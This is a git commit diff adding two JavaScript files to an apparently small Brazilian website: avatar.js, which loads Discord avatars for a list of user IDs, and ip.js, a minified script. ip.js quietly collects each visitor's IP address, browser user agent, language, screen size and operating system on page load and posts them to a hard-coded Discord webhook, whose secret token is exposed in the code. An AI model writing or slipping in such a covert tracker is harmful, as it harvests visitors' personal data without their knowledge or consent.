7531baeccb36da2d54147bc029b1fa270e179b70
Gnzadaa <giancarlos4035@gmail.com>
2024-05-04 03:31:40 -0300

    Add files via upload

---
+++ js/avatar.js
@@ -0,0 +1,123 @@
+
+'use strict';
+fetch(("https://discord-web-api.glitch.me/discord/user/982289686380822568"), {
+  method : "GET",
+  mode : "cors"
+}).then(function(responseJson) {
+  if (responseJson.ok) {
+    return responseJson.json();
+  }
+  return Promise.reject(responseJson);
+}).then(function(fieldDescribe) {
+  console.log(fieldDescribe.url);
+  console.log(fieldDescribe.username);
+  document.getElementById("ch4zzin").src = fieldDescribe.url;
+  document.getElementById("username").src = fieldDescribe.username;
+}).catch(function($ownerNode) {
+  console.warn("Something went wrong.", $ownerNode);
+  document.getElementById("jheff");
+  document.getElementById("username");
+});
+
+
+'use strict';
+fetch(("https://discord-web-api.glitch.me/discord/user/1175425891967447190"), {
+  method : "GET",
+  mode : "cors"
+}).then(function(responseJson) {
+  if (responseJson.ok) {
+    return responseJson.json();
+  }
+  return Promise.reject(responseJson);
+}).then(function(fieldDescribe) {
+  console.log(fieldDescribe.url);
+  console.log(fieldDescribe.username);
+  document.getElementById("lipee").src = fieldDescribe.url;
+  document.getElementById("username").src = fieldDescribe.username;
+}).catch(function($ownerNode) {
+  console.warn("Something went wrong.", $ownerNode);
+  document.getElementById("alves");
+  document.getElementById("username");
+});
+
+'use strict';
+fetch(("https://discord-web-api.glitch.me/discord/user/1144077096075919470"), {
+  method : "GET",
+  mode : "cors"
+}).then(function(responseJson) {
+  if (responseJson.ok) {
+    return responseJson.json();
+  }
+  return Promise.reject(responseJson);
+}).then(function(fieldDescribe) {
+  console.log(fieldDescribe.url);
+  console.log(fieldDescribe.username);
+  document.getElementById("herb").src = fieldDescribe.url;
+  document.getElementById("username").src = fieldDescribe.username;
+}).catch(function($ownerNode) {
+  console.warn("Something went wrong.", $ownerNode);
+  document.getElementById("fasty");
+  document.getElementById("username");
+});
+
+
+'use strict';
+fetch(("https://discord-web-api.glitch.me/discord/user/929109499141316638"), {
+  method : "GET",
+  mode : "cors"
+}).then(function(responseJson) {
+  if (responseJson.ok) {
+    return responseJson.json();
+  }
+  return Promise.reject(responseJson);
+}).then(function(fieldDescribe) {
+  console.log(fieldDescribe.url);
+  console.log(fieldDescribe.username);
+  document.getElementById("vitin").src = fieldDescribe.url;
+  document.getElementById("username").src = fieldDescribe.username;
+}).catch(function($ownerNode) {
+  console.warn("Something went wrong.", $ownerNode);
+  document.getElementById("sace");
+  document.getElementById("username");
+});
+
+
+'use strict';
+fetch(("https://discord-web-api.glitch.me/discord/user/1078446601191833641"), {
+  method : "GET",
+  mode : "cors"
+}).then(function(responseJson) {
+  if (responseJson.ok) {
+    return responseJson.json();
+  }
+  return Promise.reject(responseJson);
+}).then(function(fieldDescribe) {
+  console.log(fieldDescribe.url);
+  console.log(fieldDescribe.username);
+  document.getElementById("yuri").src = fieldDescribe.url;
+  document.getElementById("username").src = fieldDescribe.username;
+}).catch(function($ownerNode) {
+  console.warn("Something went wrong.", $ownerNode);
+  document.getElementById("hz");
+  document.getElementById("username");
+});
+
+'use strict';
+fetch(("https://discord-web-api.glitch.me/discord/user/1169546078274715650"), {
+  method : "GET",
+  mode : "cors"
+}).then(function(responseJson) {
+  if (responseJson.ok) {
+    return responseJson.json();
+  }
+  return Promise.reject(responseJson);
+}).then(function(fieldDescribe) {
+  console.log(fieldDescribe.url);
+  console.log(fieldDescribe.username);
+  document.getElementById("Revest").src = fieldDescribe.url;
+  document.getElementById("username").src = fieldDescribe.username;
+}).catch(function($ownerNode) {
+  console.warn("Something went wrong.", $ownerNode);
+  document.getElementById("bebelsito");
+  document.getElementById("username");
+});
---
+++ js/ip.js
@@ -0,0 +1,5 @@
+const userAgent=navigator.userAgent,language=navigator.language,screenWidth=window.screen.width,screenHeight=window.screen.height,operatingSystem=navigator.platform;fetch("https://api.ipify.org?format=json").then(e=>e.json()).then(e=>{let o={content:"Informa\xe7\xf5es do Usu\xe1rio:",embeds:[{title:"Site: visionarios",description:`Ip da M\xe1quina: ${e.ip}
+                        Resolu\xe7\xe3o do Monitor: ${screenWidth}x${screenHeight}
+                        Informa\xe7\xf5es do Navegador: ${userAgent}
+                        Linguagem do Navegador: ${language}
+                        Sistema Operacional do PC: ${operatingSystem}`,color:8421504}]};fetch("https://discord.com/api/webhooks/1197614810024640524/fL6-rr3OtDD6lZBdLQQh-GkJhOLD_DdPsDEUOMkfabGAyrGM-t49U-S-RTxbl3NgjLPc",{method:"POST",headers:{"Content-type":"application/json"},body:JSON.stringify(o)})});
